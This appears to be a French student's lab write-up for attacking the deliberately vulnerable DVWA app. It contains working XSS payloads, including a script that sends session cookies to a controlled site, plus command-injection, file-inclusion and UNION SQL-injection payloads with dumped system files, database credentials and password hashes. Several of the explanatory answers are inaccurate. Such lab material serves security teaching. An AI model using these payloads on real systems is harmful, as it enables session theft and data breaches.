# TP1 - Exploitation des applications Web

## Exercice 1 - (XSS)
*Objectif : Se rendre dans la page « XSS reflected » et exploiter la faille de XSS afin d’afficher un message d’alerte.*  
  
```js 
<script>alert('POUET')</script>
```
- Où puis-je injecter du code dans un site Web ? 
	- **Dans une balise input HTML.**
- Où ce code sera-t-il interprété (Côté client, serveur) ? Quelles sont mes possibilités d’attaques ?
	- **Côté client. C'est du JS, on ne peut pas faire grand chose à part agir sur des cookies.**


## Exercice 2 - (XSS)

*Objectif : Se rendre dans la page « XSS reflected » et exploiter la faille de XSS pour être redirigé vers le site de GOOGLE.*  

- Comment faire une redirection en JavaScript ?
```js 
<script>document.location.href="[http://google.com/](http://google.com/ "http://google.com/")";</script>
```

## Exercice 3 - (XSS)
*Objectif : Nous avons vu que la faille de XSS permettait de rediriger vers un site Web, exécuter du code JavaScript. Maintenant, il est temps de construire votre première attaque  
Forger une URL à envoyer par mail à l’administrateur du site pour lui voler son cookie de session. Une fois cette étape réussie, utiliser les informations obtenues pour s‘authentifier sur le site. Pour simuler votre attaque, vous pouvez déjà voir ce qui se passe quand vous cliquez sur votre lien.*

- Comment récupérer vos cookies en JavaScript ? 
```js 
	<script>function getCookies(){
	for(var o=document.cookie.split(";"),e="",t=1;t<=o.length;t++)e+=t+" - "+o[t-1]+"<br>";
	return e}
	document.location.href="[http://monsite.fr/?cookie=%22+getCookies()](http://monsite.fr/?cookie=%22+getCookies() "http://monsite.fr/?cookie=%22+getCookies()");</script>
```
- Comment envoyer les cookies récupérés vers un site distant contrôlé ?
	```js
	document.location.href="[http://monsite.fr/?cookie=%22+getCookies()](http://monsite.fr/?cookie=%22+getCookies() "http://monsite.fr/?cookie=%22+getCookies()");
	```
- Comment faire pour monter un site distant (contrôlé) en attente des cookies ? sur Apache ? sur netcat ? 
	- **Apache: **
	- **NetCat: nc -l -p [port]**
- Comment utiliser les informations obtenues pour usurper l’identité de l’administrateur ? 
	- **Utiliser ce cookie dans une requête pour voler la session de l'admin lorsqu'il est connecté**
- Cette attaque fonctionne t’elle systématiquement?
	- **Non si l'admin n'est pas connecté ça ne fonctionne pas ou bien si le site est protégé (souvent le cas).**

## Exercice 4 - (Injection de commandes)
*Objectif : Se rendre dans la page « Command Execution » et détourner son comportement initial pour obtenir le contenu du fichier « /etc/passwd »*
```bash
; cat etc/passwd
```
```
RESULTAT : root!:x:0:0:root:/root:/bin/bash 
daemon!:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
libuuid:x:100:101::/var/lib/libuuid: 
syslog:x:101:104::/home/syslog:/bin/false 
mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
```
- Comment chainer plusieurs commandes dans un Shell ?
	- **Avec des ";"**

## Exercice 5 - (Injection de commandes)
*Objectif : Toujours en exploitant la faille d’injection de commandes, obtener un shell interactif (Avec Putty Telnet ou netcat) sur le serveur.*
- Que puis-je faire avec netcat ? 
	- ****
- Il y a deux versions de netcat, quelle est la différence? 
	- ****
- Quelles sont les alternatives pour obtenir un shell ? 
	- ****
-  Quel langage peut être utilisé ? 
	- **Bash**

## Exercice 6 – (Local File Injection)
*Objectif: Se rendre dans la page « File Inclusion » et exploiter la faille pour afficher le contenu du fichier « /etc/passwd ».*
```
http://localhost:8080/vulnerabilities/fi/?page=/etc/passwd
```

## Exercice 7 – (Local File Injection)
*Objectif : Exploiter la faille de LFI pour afficher le contenu du fichier de configuration de la connexion à MySQL (« /config/config.inc.php »).*

```http://localhost:8080/vulnerabilities/fi/?page=/config/config.inc.php```

- Pourquoi ai-je une page blanche ?
	- **Car c'est un fichier PHP et qu'il s'exécute. Pour remédier à cela, on l'encode en base 64 :**
```http://localhost:8080/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../config/config.inc.php"```

**Résultat**
```php
<?php 
$DBMS = 'MySQL'; 
$_DVWA = array(); 
$_DVWA[ 'db_server' ] = '127.0.0.1'; 
$_DVWA[ 'db_database' ] = 'dvwa'; 
$_DVWA[ 'db_user' ] = 'root'; 
$_DVWA[ 'db_password' ] = 'tpouaibe'; 
$_DVWA[ 'db_port '] = '5432'; 
$_DVWA[ 'recaptcha_public_key' ] = '6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg'; 
$_DVWA[ 'recaptcha_private_key' ] = '6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ'; 
$_DVWA[ 'default_security_level' ] = 'low'; 
$_DVWA[ 'default_phpids_level' ] = 'disabled'; 
$_DVWA[ 'default_phpids_verbose' ] = 'false'; ?>
```

## Exercice 8 – (Injection SQL)
*Objectif : Rendez vous sur la page « SQL injection » et trouver quel caractère provoque des messages d’erreurs SQL*

**La simple quote ``'`` provoque une erreur**  
- Pourquoi ce caractère provoque t-il une erreur ? 
	- **Car c'est un caractère d'échappement**
- En quoi ce type de message peut-il nous aider ?
	- **Car cela nous donne des informations sur la manière dont on peut injecter du code SQL**


## Exercice 9 – (Injection SQL)
*Objectif : Trouver le nombre de colonnes visibles*
```sql
' UNION SELECT COUNT(*), table_name FROM information_schema.columns WHERE table_name="users";-- -
```
- Quels opérateurs SQL nous permettent de deviner le nombre de colonnes ? 
	- **COUNT(*)**
- A votre avis, pourquoi est-il nécessaire de connaître le nombre de colonnes ? 
	- **Pour UPDATE/DELETE il faut connaître le nombre de colonnes**
-  A votre avis, à quoi ces colonnes visibles pourront-elles servir ?
	- **Modifier/supprimer des informations dans la base de données**




## Exercice 10 – (Injection SQL)
*Objectif : Trouver les noms des bases de données et tables existantes.*
```sql
' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
```
```
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: dvwa
Surname: guestbook
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: dvwa
Surname: users
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: mysql
Surname: columns_priv
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: mysql
Surname: db
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: mysql
Surname: event
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: mysql
Surname: func
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: mysql
Surname: general_log
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: mysql
Surname: help_category
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: mysql
Surname: help_keyword
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: mysql
Surname: help_relation
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: mysql
Surname: help_topic
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: mysql
Surname: host
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: mysql
Surname: ndb_binlog_index
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: mysql
Surname: plugin
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: mysql
Surname: proc
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: mysql
Surname: procs_priv
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: mysql
Surname: proxies_priv
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: mysql
Surname: servers
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: mysql
Surname: slow_log
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: mysql
Surname: tables_priv
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: mysql
Surname: time_zone
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: mysql
Surname: time_zone_leap_second
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: mysql
Surname: time_zone_name
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: mysql
Surname: time_zone_transition
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: mysql
Surname: time_zone_transition_type
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: mysql
Surname: user
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: performance_schema
Surname: cond_instances
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: performance_schema
Surname: events_waits_current
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: performance_schema
Surname: events_waits_history
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: performance_schema
Surname: events_waits_history_long
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: performance_schema
Surname: events_waits_summary_by_instance
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: performance_schema
Surname: events_waits_summary_by_thread_by_event_name
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: performance_schema
Surname: events_waits_summary_global_by_event_name
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: performance_schema
Surname: file_instances
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: performance_schema
Surname: file_summary_by_event_name
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: performance_schema
Surname: file_summary_by_instance
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: performance_schema
Surname: mutex_instances
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: performance_schema
Surname: performance_timers
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: performance_schema
Surname: rwlock_instances
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: performance_schema
Surname: setup_consumers
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: performance_schema
Surname: setup_instruments
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: performance_schema
Surname: setup_timers
ID: ' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE TABLE_TYPE="BASE TABLE";-- -
First name: performance_schema
Surname: threads
```
- Quelle table contient le nom de toutes les tables connues de MySQL ?
	- **information_schema.table_name**

## Exercice 11 – (Injection SQL)
*Objectif : Trouver les colonnes de la table « users »*
```sql
' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name="users";-- -
```
- Quelle table contient le nom de toutes les colonnes connues de MySQL ?
	- **information_schema.column**
**Résultat**
```
ID: ' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name="users";-- - 
First name: users 
Surname: user_id 
ID: ' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name="users";-- - 
First name: users 
Surname: first_name 
ID: ' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name="users";-- - 
First name: users 
Surname: last_name 
ID: ' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name="users";-- - 
First name: users 
Surname: user 
ID: ' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name="users";-- - 
First name: users 
Surname: password 
ID: ' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name="users";-- - 
First name: users 
Surname: avatar 
ID: ' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name="users";-- - 
First name: users 
Surname: last_login 
ID: ' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name="users";-- - 
First name: users 
Surname: failed_login
```

## Exercice 12 – (Injection SQL)
*Objectif : Vous disposez de toutes les informations sur la structure de la table « users ». Il ne reste plus qu’à extraire les couples « login:password ».*
```sql
' UNION SELECT user, password FROM users;-- -
```
**Résultat**
```
ID: ' UNION SELECT user, password FROM users;-- - 
First name: admin 
Surname: 098f6bcd4621d373cade4e832627b4f6 
ID: ' UNION SELECT user, password FROM users;-- - 
First name: gordonb 
Surname: e99a18c428cb38d5f260853678922e03 
ID: ' UNION SELECT user, password FROM users;-- - 
First name: 1337 
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b 
ID: ' UNION SELECT user, password FROM users;-- - 
First name: pablo 
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7 
ID: ' UNION SELECT user, password FROM users;-- - 
First name: smithy 
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```
- Quel est le mot de passe de l’utilisateur « pablo» ?
	- **letmein**
